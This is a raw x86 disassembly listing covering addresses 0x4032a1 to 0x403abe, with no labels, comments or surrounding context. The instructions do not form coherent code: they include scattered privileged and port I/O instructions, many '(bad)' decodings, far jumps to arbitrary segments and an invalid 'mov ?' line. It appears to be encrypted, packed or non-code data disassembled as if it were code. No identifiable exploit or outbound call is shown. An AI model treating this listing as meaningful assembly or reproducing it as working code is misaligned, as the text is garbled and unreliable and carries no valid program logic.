  4032a1:	jle    0x403264
  4032a3:	or     DWORD PTR [ebp-0x6d5992fc],ebp
  4032a9:	aad    0x32
  4032ab:	mov    edi,0xd06df5c8
  4032b0:	ins    DWORD PTR es:[edi],dx
  4032b1:	and    BYTE PTR [eax-0x3a],cl
  4032b4:	aad    0x4e
  4032b6:	push   edx
  4032b7:	sbb    al,0xd9
  4032b9:	cmp    edi,DWORD PTR [edi+0x74]
  4032bc:	mov    al,0x4d
  4032be:	mov    dh,0x74
  4032c0:	push   0xffffffa7
  4032c2:	aaa    
  4032c3:	enter  0xb392,0x56
  4032c7:	js     0x40332a
  4032c9:	and    eax,0x7ae757c7
  4032ce:	pushf  
  4032cf:	push   eax
  4032d0:	inc    edi
  4032d1:	cli    
  4032d2:	adc    eax,0x6fd5bcce
  4032d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4032d8:	add    al,0x96
  4032da:	or     bh,BYTE PTR [esi+0x5f]
  4032dd:	ret    
  4032de:	push   0x4c
  4032e0:	stos   BYTE PTR es:[edi],al
  4032e1:	or     BYTE PTR [edi-0x3c7601e1],dl
  4032e7:	lods   eax,DWORD PTR ds:[esi]
  4032e8:	mov    dh,0x37
  4032ea:	xor    DWORD PTR [ebp+0x16],esi
  4032ed:	cmp    DWORD PTR [ebp+0x77c66f1f],0xc1e9bc4f
  4032f7:	push   eax
  4032f8:	inc    ebp
  4032f9:	mov    bh,0xe5
  4032fb:	inc    ecx
  4032fc:	sti    
  4032fd:	push   ss
  4032fe:	test   al,0x2b
  403300:	adc    BYTE PTR [edi+0x6c31d498],bh
  403306:	pop    ebp
  403307:	cmp    eax,0xfd290a6
  40330c:	pop    es
  40330d:	or     DWORD PTR [ecx],ebx
  40330f:	shr    DWORD PTR [eax+esi*1],0x7a
  403313:	push   DWORD PTR ds:0x21701016
  403319:	mov    ds:0x88ad2f2d,eax
  40331e:	cmp    eax,0x9732bbd6
  403323:	mov    edi,0xeb2903ca
  403328:	and    eax,0xe01a0656
  40332d:	jnp    0x403391
  40332f:	add    edx,DWORD PTR [ecx-0x62618588]
  403335:	in     al,0x14
  403337:	loopne 0x403371
  403339:	jmp    0x403397
  40333b:	ins    DWORD PTR es:[edi],dx
  40333c:	ss xchg edi,eax
  40333e:	add    DWORD PTR [edx],esi
  403340:	icebp  
  403341:	mov    DWORD PTR [ebp+0x7c42bf4b],ebp
  403347:	xchg   DWORD PTR [ecx-0x11399d7c],esp
  40334d:	leave  
  40334e:	adc    DWORD PTR [ecx+0x8],0x58
  403352:	cli    
  403353:	imul   DWORD PTR [ebp-0x48]
  403356:	push   esi
  403357:	(bad)  
  403358:	clc    
  403359:	push   ss
  40335a:	stos   DWORD PTR es:[edi],eax
  40335b:	push   0x22a99de2
  403360:	in     eax,dx
  403361:	cmc    
  403362:	add    DWORD PTR [eax+0x5d],ebx
  403365:	xor    edx,esp
  403367:	xchg   esp,eax
  403368:	lds    edx,FWORD PTR [ecx+0x1573ec83]
  40336e:	xchg   edi,eax
  40336f:	std    
  403370:	in     al,0xb
  403372:	xor    DWORD PTR [ebx],ecx
  403374:	xchg   edx,eax
  403375:	mov    al,ds:0xa493bc7c
  40337a:	pop    esp
  40337b:	les    esi,FWORD PTR [edi-0x35]
  40337e:	icebp  
  40337f:	cli    
  403380:	lds    eax,FWORD PTR [ebp+edx*1-0x5f]
  403384:	jbe    0x403339
  403386:	sti    
  403387:	xor    al,0xe0
  403389:	mov    ah,0x58
  40338b:	sar    BYTE PTR [ecx+0x35665e26],1
  403391:	loop   0x403340
  403393:	call   0x701b1513
  403398:	ins    DWORD PTR es:[edi],dx
  403399:	xchg   DWORD PTR [eax-0x4e],ecx
  40339c:	xchg   DWORD PTR [esi-0x1f47e37],ebp
  4033a2:	daa    
  4033a3:	xchg   esp,eax
  4033a4:	mov    esi,0xe800224f
  4033a9:	xor    al,0xfa
  4033ab:	pop    ebp
  4033ac:	push   edi
  4033ad:	repz sbb DWORD PTR ds:0x798ad7a3,0xffffffce
  4033b5:	rcl    DWORD PTR [esi],1
  4033b7:	mov    ch,bl
  4033b9:	(bad)  
  4033ba:	fnstenv [edx-0xf704396]
  4033c0:	and    al,ah
  4033c2:	sbb    al,0x71
  4033c4:	outs   dx,DWORD PTR ds:[esi]
  4033c5:	clc    
  4033c6:	fmul   QWORD PTR [eax+esi*4]
  4033c9:	sub    DWORD PTR [esi-0x7dfe9e9a],ecx
  4033cf:	pusha  
  4033d0:	pusha  
  4033d1:	aam    0x3b
  4033d3:	xchg   ebx,eax
  4033d4:	mov    dl,0xf5
  4033d6:	repz mov ecx,0x382cdf92
  4033dc:	add    BYTE PTR [eax-0x284b6bac],dh
  4033e2:	int    0x7e
  4033e4:	in     eax,dx
  4033e5:	push   edx
  4033e6:	popa   
  4033e7:	xor    BYTE PTR es:[ecx+0x2e],dh
  4033eb:	mov    edx,0x334d9059
  4033f0:	sub    ah,ch
  4033f2:	xchg   esp,eax
  4033f3:	inc    ebp
  4033f4:	mov    bh,0xea
  4033f6:	sbb    bh,0xb4
  4033f9:	mov    dh,0xcc
  4033fb:	outs   dx,BYTE PTR ds:[esi]
  4033fc:	mov    al,0x2a
  4033fe:	mov    esi,0xe39df2e4
  403403:	pop    ebp
  403404:	dec    esp
  403405:	inc    esp
  403406:	out    0x2d,eax
  403408:	dec    ebp
  403409:	sub    BYTE PTR [edi-0x370187a4],bl
  40340f:	dec    edi
  403410:	test   dl,0x5d
  403413:	cmc    
  403414:	sar    DWORD PTR [eax-0x38de638e],1
  40341a:	popf   
  40341b:	fwait
  40341c:	outs   dx,BYTE PTR ds:[esi]
  40341d:	pop    ss
  40341e:	mov    ecx,0x4e77e99
  403423:	adc    eax,0xb1e55d08
  403428:	test   BYTE PTR [edx-0x12b78995],bh
  40342e:	jmp    0x55f7:0xe9e3d3d0
  403435:	sub    esp,ebx
  403437:	popa   
  403438:	mov    ecx,edx
  40343a:	and    ch,ah
  40343c:	push   0xfffffffc
  40343e:	rcr    ch,0xd2
  403441:	inc    ebp
  403442:	jae    0x4034af
  403444:	stos   BYTE PTR es:[edi],al
  403445:	cmp    bl,BYTE PTR ds:0xe827fdd7
  40344b:	mov    es,WORD PTR [eax-0x5c]
  40344e:	or     eax,0x6d52ccc4
  403453:	sti    
  403454:	inc    esp
  403455:	pop    eax
  403456:	pusha  
  403457:	lock lea esi,[esi+ecx*8-0x59]
  40345c:	arpl   WORD PTR [ebx],ax
  40345e:	and    edi,esp
  403460:	add    BYTE PTR [ebx],bl
  403462:	ds std 
  403464:	jne    0x4033ee
  403466:	addr16 mov edi,0x1c08cc7c
  40346c:	sub    edx,DWORD PTR [esi-0x597d500f]
  403472:	or     al,0x85
  403474:	adc    BYTE PTR [ecx+ebp*2-0x3982a30e],dl
  40347b:	sbb    edi,edx
  40347d:	fwait
  40347e:	mov    eax,0x674e5172
  403483:	imul   ecx,ebx,0xae0f8684
  403489:	add    BYTE PTR [esi+eiz*4-0xa],ch
  40348d:	lock stc 
  40348f:	pop    edx
  403490:	jb     0x4034fd
  403492:	cmp    bh,BYTE PTR [ecx+esi*8+0x3e]
  403496:	es es enter 0xa776,0x2a
  40349c:	and    eax,0x4bd7ea75
  4034a1:	int    0x5d
  4034a3:	test   DWORD PTR [ebx-0x60],ebp
  4034a6:	sbb    al,0xaf
  4034a8:	mov    DWORD PTR [ebx-0x1ade63b5],ebx
  4034ae:	mov    ebp,0x4fcf3812
  4034b3:	and    al,0x59
  4034b5:	mov    dl,0x2f
  4034b7:	jle    0x403449
  4034b9:	push   eax
  4034ba:	jle    0x4034d2
  4034bc:	jno    0x403444
  4034be:	or     edx,DWORD PTR [ecx+0x535131c8]
  4034c4:	xchg   edx,eax
  4034c5:	out    dx,al
  4034c6:	cmp    al,0xb6
  4034c8:	push   ds
  4034c9:	jmp    0x48f2d4a0
  4034ce:	mov    edi,0x8d7398f2
  4034d3:	outs   dx,DWORD PTR ds:[esi]
  4034d4:	inc    esp
  4034d5:	inc    edi
  4034d6:	sub    al,0xde
  4034d8:	mov    esi,0x6e9b34f3
  4034dd:	pop    ebx
  4034de:	adc    al,0x19
  4034e0:	lea    esp,[ebx]
  4034e2:	and    bh,ch
  4034e4:	pop    ebx
  4034e5:	test   ebp,esp
  4034e7:	or     DWORD PTR [esi+0x5cde4866],ebp
  4034ed:	and    ecx,esp
  4034ef:	inc    edx
  4034f0:	cmp    ah,bh
  4034f2:	test   al,0xb9
  4034f4:	dec    esp
  4034f5:	lahf   
  4034f6:	stos   DWORD PTR es:[edi],eax
  4034f7:	push   0xd52148a4
  4034fc:	sub    bh,BYTE PTR [ecx+0x4b]
  4034ff:	mov    eax,ds:0x5d5f49c
  403504:	or     dh,dl
  403506:	push   edx
  403507:	xor    eax,0xb9a570f
  40350c:	xchg   edi,eax
  40350d:	into   
  40350e:	std    
  40350f:	xor    al,0x89
  403511:	into   
  403512:	loopne 0x403572
  403514:	and    eax,0x92c9a650
  403519:	xchg   edx,eax
  40351a:	adc    al,dh
  40351c:	hlt    
  40351d:	mov    ebx,0xb1b21c1d
  403522:	pop    edi
  403523:	enter  0xa072,0x45
  403527:	cmp    BYTE PTR [ecx+0x32],0xb4
  40352b:	sub    edi,DWORD PTR [edx-0x52f076c7]
  403531:	adc    al,0x77
  403533:	loop   0x403590
  403535:	mov    edi,0xf897b1be
  40353a:	call   0x76c10322
  40353f:	adc    ah,BYTE PTR [ebp+0x77]
  403542:	icebp  
  403543:	jne    0x403523
  403545:	sbb    dl,BYTE PTR [esi+0x46]
  403548:	xor    eax,0xd1adfb33
  40354d:	shr    bh,cl
  40354f:	test   al,0x95
  403551:	xlat   BYTE PTR ds:[ebx]
  403552:	test   eax,0xdd7df01b
  403557:	jp     0x40358d
  403559:	shl    BYTE PTR [eax+0x7e1709a2],1
  40355f:	and    al,0x22
  403561:	pusha  
  403562:	call   0x6b82:0xed215e95
  403569:	(bad)  
  40356a:	xor    eax,0x5b85293c
  40356f:	mov    WORD PTR [edi+0x667a70a2],ss
  403575:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403576:	(bad)  
  403577:	pop    esi
  403578:	repnz adc BYTE PTR [ebx+0x61f202e4],cl
  40357f:	sub    DWORD PTR [edx+0x61],ebp
  403582:	xchg   ecx,eax
  403583:	nop
  403584:	mov    bh,0xcb
  403586:	push   ss
  403587:	xor    al,0x8f
  403589:	cld    
  40358a:	inc    ebp
  40358b:	repnz das 
  40358d:	jle    0x403588
  40358f:	push   cs
  403590:	imul   edx,DWORD PTR [edx-0x1b2b8a78],0x8
  403597:	push   ecx
  403598:	dec    esi
  403599:	and    eax,0x9f1d700
  40359e:	cld    
  40359f:	jmp    0xcd40:0xf3c068fd
  4035a6:	jmp    0xf2ad:0xcce79135
  4035ad:	mov    al,0xc4
  4035af:	xor    bh,BYTE PTR [ecx]
  4035b1:	jae    0x40355d
  4035b3:	xchg   edx,eax
  4035b4:	mov    ebp,0x354cd267
  4035b9:	bound  esi,QWORD PTR [ebx+ebx*8+0x3487bbcf]
  4035c0:	pop    edi
  4035c1:	xor    eax,edi
  4035c3:	sar    BYTE PTR [edx],0x2e
  4035c6:	into   
  4035c7:	mov    esp,0x14fd7628
  4035cc:	enter  0x86b1,0xde
  4035d0:	outs   dx,BYTE PTR ds:[esi]
  4035d1:	adc    BYTE PTR [edi],ch
  4035d3:	(bad)  
  4035d5:	adc    eax,0xac39e475
  4035da:	cmp    al,0x67
  4035dc:	pop    eax
  4035dd:	inc    edi
  4035de:	push   ecx
  4035df:	mov    esi,0xd76b0a82
  4035e4:	mov    ebp,0x45947ebe
  4035e9:	mov    esi,0x22065fc3
  4035ee:	xlat   BYTE PTR ds:[ebx]
  4035ef:	and    esp,ebx
  4035f1:	and    DWORD PTR [eax-0x64],0x3a
  4035f5:	das    
  4035f6:	cs push ds
  4035f8:	mov    ch,0xc9
  4035fa:	cmp    ch,BYTE PTR [edx]
  4035fc:	fldcw  WORD PTR [edx+ecx*4+0x2b177a14]
  403603:	xchg   ebp,eax
  403604:	mov    bl,0x9
  403606:	js     0x403674
  403608:	pop    esp
  403609:	xchg   esi,eax
  40360a:	push   ecx
  40360b:	loope  0x403663
  40360d:	std    
  40360e:	dec    edx
  40360f:	push   ds
  403610:	in     al,dx
  403611:	xlat   BYTE PTR ds:[ebx]
  403612:	call   0xaefadde2
  403617:	push   es
  403618:	sbb    esi,edi
  40361a:	sbb    al,0x91
  40361c:	mov    dh,BYTE PTR ds:0xb5fcfa8e
  403622:	push   ds
  403623:	retf   0xccc9
  403626:	push   cs
  403627:	aaa    
  403628:	das    
  403629:	dec    ebp
  40362a:	sbb    al,dl
  40362c:	out    0xd3,eax
  40362e:	shl    BYTE PTR [ecx],0x42
  403631:	stos   DWORD PTR es:[edi],eax
  403632:	jmp    DWORD PTR [esi]
  403634:	dec    BYTE PTR [eax]
  403636:	cmp    BYTE PTR [ebp-0x32],bl
  403639:	sbb    ebp,DWORD PTR [ebx+0x1fb2f198]
  40363f:	fbld   TBYTE PTR [eax+0x6ae4e5f7]
  403645:	in     eax,dx
  403646:	or     ecx,edx
  403648:	cmp    al,0x59
  40364a:	xor    ebx,DWORD PTR [ecx]
  40364c:	call   0x4454:0x6d8dff9a
  403653:	dec    ebx
  403654:	(bad)
  403657:	adc    DWORD PTR [esi],eax
  403659:	enter  0x3873,0xd6
  40365d:	mov    cl,0x1c
  40365f:	dec    edi
  403660:	bound  edx,QWORD PTR [ebx+0x6701f7d0]
  403666:	dec    ebp
  403667:	(bad)  
  403668:	jmp    0xae04:0x63b4fe94
  40366f:	out    dx,eax
  403670:	pushf  
  403671:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403672:	(bad)  
  403674:	mov    esi,0x16f1c422
  403679:	sbb    ebp,DWORD PTR [esi]
  40367b:	enter  0xf8ad,0xb4
  40367f:	out    0x81,al
  403681:	scas   eax,DWORD PTR es:[edi]
  403682:	sti    
  403683:	xchg   edx,eax
  403684:	sbb    edx,DWORD PTR [eax]
  403686:	pop    ebp
  403687:	cmp    edx,DWORD PTR [edi]
  403689:	iret   
  40368a:	mov    WORD PTR [edx+0x70],es
  40368d:	and    edx,DWORD PTR [eax-0x58]
  403690:	aam    0xc
  403692:	jnp    0x40369a
  403694:	test   al,0x7f
  403696:	retf   
  403697:	xlat   BYTE PTR ds:[ebx]
  403698:	sub    eax,0x387566c3
  40369d:	mov    eax,0x532e0273
  4036a2:	cs and eax,0x2ee88ba8
  4036a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4036a9:	jno    0x4036c9
  4036ab:	mov    edi,0xcf3d2080
  4036b0:	repz (bad)
  4036b3:	mov    esp,0x9f8dbdb5
  4036b8:	push   eax
  4036b9:	retf   0x8b87
  4036bc:	aam    0xa0
  4036be:	cwde   
  4036bf:	jecxz  0x4036cb
  4036c1:	xor    edx,DWORD PTR [eax-0x8]
  4036c4:	das    
  4036c5:	iret   
  4036c6:	pop    edi
  4036c7:	or     al,0x1a
  4036ca:	xchg   edx,eax
  4036cb:	mov    bh,0xca
  4036cd:	or     eax,DWORD PTR [ebp*8-0x1323e668]
  4036d4:	outs   dx,BYTE PTR fs:[esi]
  4036d6:	mov    esi,0xcd921cd8
  4036db:	pop    eax
  4036dc:	adc    BYTE PTR [ecx],bl
  4036de:	mov    ds:0xab5b37ac,eax
  4036e3:	add    DWORD PTR [ecx],ebp
  4036e5:	mov    esi,DWORD PTR [eax+0x73]
  4036e8:	mov    ch,0xf9
  4036ea:	pop    ebp
  4036eb:	xchg   ebx,eax
  4036ec:	test   eax,0x78474e23
  4036f1:	pop    DWORD PTR [edi-0x3f]
  4036f4:	lds    ecx,FWORD PTR [edx]
  4036f6:	sahf   
  4036f7:	inc    ebp
  4036f8:	and    esi,DWORD PTR [edi+0x44]
  4036fb:	into   
  4036fc:	repnz sahf 
  4036fe:	xchg   DWORD PTR [edi],ebp
  403700:	out    dx,al
  403701:	mov    ds:0xa42a8b8b,al
  403706:	imul   ecx,DWORD PTR [edx-0x2],0x21
  40370a:	or     BYTE PTR [ecx-0x25d484f9],al
  403710:	aas    
  403711:	add    al,0xb5
  403713:	push   ebp
  403714:	xchg   edx,eax
  403715:	adc    BYTE PTR [edi],ch
  403717:	jmp    0xec7e:0xddede65b
  40371e:	sub    dl,BYTE PTR [ecx+0x2559a029]
  403724:	jmp    0x465ba64f
  403729:	in     eax,dx
  40372a:	cld    
  40372b:	and    ebp,DWORD PTR [ebx]
  40372d:	int3   
  40372e:	push   ds
  40372f:	xor    ch,BYTE PTR [edx-0x28ca6621]
  403735:	inc    edi
  403736:	jmp    0x811:0x2ee7fc84
  40373d:	xchg   esi,eax
  40373e:	call   0x117f:0x43d6a253
  403745:	or     DWORD PTR [esi],esp
  403747:	cmp    al,0xc3
  403749:	es adc al,0x4d
  40374c:	ss fdivrp st(6),st
  40374f:	sbb    eax,0xabd98a92
  403754:	call   0x2c3965ab
  403759:	out    0xa5,eax
  40375b:	shr    DWORD PTR [edi-0x2b222c96],1
  403761:	cmc    
  403762:	xchg   esp,eax
  403763:	scas   al,BYTE PTR es:[edi]
  403764:	in     eax,dx
  403765:	je     0x40375e
  403767:	xor    ecx,DWORD PTR [eax+0x4cb9eb36]
  40376d:	add    edx,DWORD PTR [ecx]
  40376f:	xor    BYTE PTR [eax],0xcb
  403772:	xor    BYTE PTR [edi],0x3e
  403775:	lds    esi,FWORD PTR [edx]
  403777:	xlat   BYTE PTR ds:[ebx]
  403778:	mov    ch,0x1b
  40377a:	pop    edi
  40377b:	popf   
  40377c:	dec    edi
  40377d:	dec    eax
  40377e:	jl     0x403737
  403780:	clc    
  403781:	daa    
  403782:	push   0x202a346
  403787:	cmc    
  403788:	stos   BYTE PTR es:[edi],al
  403789:	xchg   edx,eax
  40378a:	into   
  40378b:	push   0x56e70259
  403790:	daa    
  403791:	lods   al,BYTE PTR ds:[esi]
  403792:	or     edi,DWORD PTR [edi+0x25]
  403795:	fcmovb st,st(1)
  403797:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403798:	gs fwait
  40379a:	mov    al,0x7a
  40379c:	pop    esp
  40379d:	sbb    eax,0xc25964b0
  4037a2:	push   ss
  4037a3:	ret    0xa0b1
  4037a6:	and    DWORD PTR [ebp-0x2b],eax
  4037a9:	lds    ebp,FWORD PTR [edx+eax*1-0x41]
  4037ad:	sub    al,bh
  4037af:	inc    eax
  4037b0:	ror    BYTE PTR [edx+0x7ea758c],cl
  4037b6:	fs into 
  4037b8:	cwde   
  4037b9:	out    dx,al
  4037ba:	int    0x9b
  4037bc:	bound  eax,QWORD PTR [eax+0x6bebac3e]
  4037c2:	xor    eax,0xcf9f0c9a
  4037c7:	push   0xa
  4037c9:	dec    ebp
  4037ca:	dec    esi
  4037cb:	xor    eax,0x5b670dd3
  4037d0:	xor    BYTE PTR [esi-0x474525c2],bl
  4037d6:	and    DWORD PTR [ebx+0x1f],ebx
  4037d9:	(bad)  
  4037db:	(bad)  
  4037dc:	in     al,0xb1
  4037de:	shr    DWORD PTR [edx-0x68],cl
  4037e1:	test   eax,ecx
  4037e3:	jne    0x403845
  4037e5:	cmc    
  4037e6:	add    al,0xc8
  4037e8:	jge    0x403829
  4037ea:	jp     0x4037e6
  4037ec:	pop    ds
  4037ed:	adc    al,0x7d
  4037ef:	fdiv   QWORD PTR [ebp+0x59fb6ac9]
  4037f5:	push   esp
  4037f6:	pop    eax
  4037f7:	sbb    eax,0xf03b8ad8
  4037fc:	and    ebx,DWORD PTR [ebx+ebp*4-0x3c]
  403800:	xor    esi,DWORD PTR [esp+esi*2-0x24]
  403804:	stos   BYTE PTR es:[edi],al
  403805:	mov    BYTE PTR [edx],bl
  403807:	push   0xffffffb9
  403809:	ss (bad) 
  40380b:	and    al,0xab
  40380d:	cdq    
  40380e:	mov    BYTE PTR [esi],bl
  403810:	mov    edx,0xc4f99802
  403815:	push   edi
  403816:	xor    DWORD PTR [edx+0x308e4e69],edx
  40381c:	dec    ebx
  40381d:	mov    dl,0xce
  40381f:	ds in  eax,dx
  403821:	pop    ecx
  403822:	mov    DWORD PTR [ebx+0xe0c440b],esp
  403828:	dec    esp
  403829:	add    eax,0xd85c83c2
  40382e:	imul   edi,edx,0x8af7151a
  403834:	fnstenv [ecx+0x1035a1b9]
  40383a:	pushf  
  40383b:	icebp  
  40383c:	cwde   
  40383d:	fistp  DWORD PTR [ecx-0xe68f2c2]
  403843:	add    DWORD PTR ds:0xc6138426,ebp
  403849:	stc    
  40384a:	jl     0x4038cb
  40384c:	fsub   st,st(5)
  40384e:	sbb    al,0xba
  403850:	aad    0xe4
  403852:	pusha  
  403853:	jno    0x40385a
  403855:	add    BYTE PTR [ebx-0x54912499],ah
  40385b:	fadd   QWORD PTR [edx]
  40385d:	add    al,0x5
  40385f:	cmp    esi,DWORD PTR [edx-0x36db050f]
  403865:	call   0xe75d:0xc9c1396f
  40386c:	arpl   di,di
  40386e:	jl     0x4038ce
  403870:	cmp    al,0xe4
  403872:	mov    ecx,0xf60648ca
  403877:	sar    ecx,cl
  403879:	cmc    
  40387a:	xor    eax,ecx
  40387c:	push   es
  40387d:	or     DWORD PTR [esi+0x8da4e92],edx
  403883:	loop   0x403831
  403885:	jge    0x4038a5
  403887:	fst    QWORD PTR [edi]
  403889:	out    0x91,al
  40388b:	scas   eax,DWORD PTR es:[edi]
  40388c:	jo     0x40382c
  40388e:	clc    
  40388f:	add    ah,bh
  403891:	ins    BYTE PTR es:[edi],dx
  403892:	cdq    
  403893:	jmp    0xdd41dc47
  403898:	pop    ebp
  403899:	or     DWORD PTR [ebp+0x416e0385],edx
  40389f:	fdivr  DWORD PTR [edi]
  4038a1:	jmp    0xd3ba0c04
  4038a6:	push   ecx
  4038a7:	call   0x7fd:0x80b50a5f
  4038ae:	and    eax,0xc3f2cd06
  4038b3:	loop   0x4038fa
  4038b5:	mov    dh,0xf8
  4038b7:	cmc    
  4038b8:	or     BYTE PTR ds:0x424b8487,dh
  4038be:	push   0x857f6e6
  4038c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038c4:	sub    DWORD PTR [esi+0x45],esi
  4038c7:	scas   al,BYTE PTR es:[edi]
  4038c8:	inc    esp
  4038c9:	pop    edi
  4038ca:	retf   0xd778
  4038cd:	ret    0x6420
  4038d0:	mov    ds:0xe1c40dda,al
  4038d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038d6:	mov    ebp,0x14daf75d
  4038db:	popa   
  4038dc:	stos   BYTE PTR es:[edi],al
  4038dd:	mov    ch,0x7c
  4038df:	(bad)  
  4038e0:	in     al,dx
  4038e1:	xor    BYTE PTR [esi+0x57ad603f],bh
  4038e7:	mov    esi,0x70a624f5
  4038ec:	or     al,0x93
  4038ee:	(bad)  
  4038ef:	jp     0x403912
  4038f1:	jb     0x40395e
  4038f3:	xchg   ecx,eax
  4038f4:	jge    0x40391d
  4038f6:	lds    ecx,FWORD PTR [esi+eax*2-0x4fb3d5e2]
  4038fd:	sbb    BYTE PTR [eax+0x25],bh
  403900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403901:	fs jo  0x40397f
  403904:	mov    ecx,0xfd5694cb
  403909:	pop    eax
  40390a:	sbb    BYTE PTR [ebx],cl
  40390c:	push   esp
  40390d:	xlat   BYTE PTR ds:[ebx]
  40390e:	pop    eax
  40390f:	test   al,0xa0
  403911:	test   eax,0xa40b716d
  403916:	std    
  403917:	pop    ebp
  403918:	mov    edx,edx
  40391a:	ja     0x403971
  40391c:	call   0x6a2c31d8
  403921:	imul   esp,DWORD PTR [eax],0xb76629e1
  403927:	jae    0x403919
  403929:	mov    dl,BYTE PTR [edi+0x33]
  40392c:	inc    esi
  40392d:	mov    cs:0xc8fd0826,eax
  403933:	add    al,0x7
  403935:	lock sub cl,BYTE PTR [esi+0x45]
  403939:	retf   
  40393a:	xchg   BYTE PTR [eax+0x1d],al
  40393d:	adc    dh,BYTE PTR [esi+eax*8-0x54f649]
  403944:	add    edx,DWORD PTR [ebp+0x2a]
  403947:	mov    ecx,0xde951205
  40394c:	out    dx,eax
  40394d:	clc    
  40394e:	pop    edx
  40394f:	mov    cs:0x2cfadcd0,al
  403955:	test   eax,0xcb48f1d5
  40395a:	cmp    edx,DWORD PTR [esi]
  40395c:	sti    
  40395d:	push   es
  40395e:	mov    bh,0x36
  403960:	(bad)  
  403961:	loopne 0x40392c
  403963:	add    eax,0x76da482f
  403968:	cmp    DWORD PTR [edi-0x36],edi
  40396b:	outs   dx,BYTE PTR ds:[esi]
  40396c:	aam    0x9f
  40396e:	push   es
  40396f:	lahf   
  403970:	mov    DWORD PTR [edi+0x68],eax
  403973:	cmc    
  403974:	mov    al,ds:0x2f2d0089
  403979:	xchg   ebp,eax
  40397a:	push   eax
  40397b:	sub    eax,0x8f36534b
  403980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403981:	ret    0xfc9b
  403984:	dec    ebx
  403985:	cld    
  403986:	adc    dl,BYTE PTR [eax+0x9]
  403989:	lds    edi,FWORD PTR [ecx-0x18]
  40398c:	shl    BYTE PTR [eax-0x37],0xb9
  403990:	jae    0x403994
  403992:	add    BYTE PTR [edx],bh
  403994:	push   edx
  403995:	cwde   
  403996:	xchg   edx,eax
  403997:	popf   
  403998:	or     BYTE PTR [edi],0x69
  40399b:	jne    0x403933
  40399d:	imul   edx,DWORD PTR [edx+0x43d8d2aa],0xde3d364d
  4039a7:	les    edi,FWORD PTR [eax]
  4039a9:	jp     0x4039df
  4039ab:	lods   al,BYTE PTR ds:[esi]
  4039ac:	test   BYTE PTR [esi+eax*1],dl
  4039af:	or     BYTE PTR [ebx-0x31],al
  4039b2:	js     0x403973
  4039b4:	inc    esp
  4039b5:	lods   eax,DWORD PTR ds:[esi]
  4039b6:	arpl   WORD PTR [eax],ax
  4039b8:	mov    bh,0xdd
  4039ba:	cs mov al,0x54
  4039bd:	call   0x81a2:0x3370636c
  4039c4:	add    eax,0x644399d4
  4039c9:	test   BYTE PTR [ecx-0x5c181c2e],0x47
  4039d0:	bswap  esp
  4039d2:	es push ebp
  4039d4:	push   esi
  4039d5:	mov    cl,0x89
  4039d7:	ins    BYTE PTR es:[edi],dx
  4039d8:	mov    esi,DWORD PTR [edi+ebp*4+0x3d]
  4039dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4039dd:	(bad)  
  4039de:	sbb    BYTE PTR [ebx+0x5a2a4212],al
  4039e4:	push   ss
  4039e5:	jae    0x403a3e
  4039e7:	sub    BYTE PTR [esi-0x13],bl
  4039ea:	xor    eax,0xdd3e98c9
  4039ef:	cmc    
  4039f0:	fbstp  TBYTE PTR [esi-0x2983bee1]
  4039f6:	jmp    0xa8e3417d
  4039fb:	jno    0x4039d3
  4039fd:	out    0xce,eax
  4039ff:	ret    
  403a00:	xchg   BYTE PTR [edx-0x4961a0f2],dl
  403a06:	scas   eax,DWORD PTR es:[edi]
  403a07:	mov    esp,0x558013b4
  403a0c:	fidivr DWORD PTR [esi-0x3b]
  403a0f:	sbb    eax,0xc463cbb8
  403a14:	mov    dh,0xc3
  403a16:	jl     0x403a39
  403a18:	popa   
  403a19:	sbb    DWORD PTR [esi],ebp
  403a1b:	out    dx,eax
  403a1c:	jnp    0x4039d1
  403a1e:	pop    ds
  403a1f:	mov    ?,WORD PTR [ebx-0x7c73f7c2]
  403a25:	mov    bl,0xfd
  403a27:	fild   DWORD PTR ds:0xbbd0996d
  403a2d:	fiadd  DWORD PTR [eax]
  403a2f:	sbb    eax,0xf7a502ea
  403a34:	cmp    eax,0x678bb828
  403a39:	pop    esi
  403a3a:	push   edx
  403a3b:	fisubr WORD PTR [edi+edx*1+0x2b]
  403a3f:	jns    0x403a51
  403a41:	out    0xb6,eax
  403a43:	scas   al,BYTE PTR es:[edi]
  403a44:	loop   0x4039ec
  403a46:	sub    dl,0x31
  403a49:	sbb    esi,DWORD PTR [ebx-0x7a3e6016]
  403a4f:	lock imul eax,DWORD PTR [ecx-0x2dde0060],0xbd4ce390
  403a5a:	mov    esp,0xed2878e6
  403a5f:	mov    ah,0x4c
  403a61:	repz enter 0xdc3c,0x2b
  403a66:	imul   eax,DWORD PTR [ebx],0x12
  403a69:	sub    eax,0x14f18cf2
  403a6e:	cwde   
  403a6f:	push   0x38cee7f9
  403a74:	xor    DWORD PTR [ecx-0x44664d1],ebx
  403a7a:	sar    DWORD PTR [ebx],cl
  403a7c:	dec    esp
  403a7d:	(bad)  
  403a7e:	in     al,0x87
  403a80:	lods   eax,DWORD PTR ds:[esi]
  403a81:	cmp    ebx,esi
  403a83:	push   cs
  403a84:	iret   
  403a85:	push   0x18
  403a87:	pop    ebx
  403a88:	ins    BYTE PTR es:[edi],dx
  403a89:	push   ebx
  403a8a:	(bad)  
  403a8b:	outs   dx,DWORD PTR ds:[esi]
  403a8c:	sahf   
  403a8d:	pop    esi
  403a8e:	adc    ecx,DWORD PTR [edx]
  403a90:	nop
  403a91:	pop    edi
  403a92:	ret    
  403a93:	lahf   
  403a94:	push   ebx
  403a95:	inc    edx
  403a96:	fimul  DWORD PTR [edx+ebp*2-0x70efb640]
  403a9d:	cmp    BYTE PTR [eax+0x2b08a6],ah
  403aa3:	push   esp
  403aa4:	fcom   QWORD PTR [edx+eiz*4+0x6c487721]
  403aab:	outs   dx,BYTE PTR ds:[esi]
  403aac:	pop    ebp
  403aad:	jbe    0x403abc
  403aaf:	fnsave ds:0x3186d28b
  403ab5:	xchg   esi,eax
  403ab6:	dec    ecx
  403ab7:	pop    ebx
  403ab8:	mov    edi,0xe6f9fb2e
  403abd:	sti    
  403abe:	fsubr  DWORD PTR [ebx]
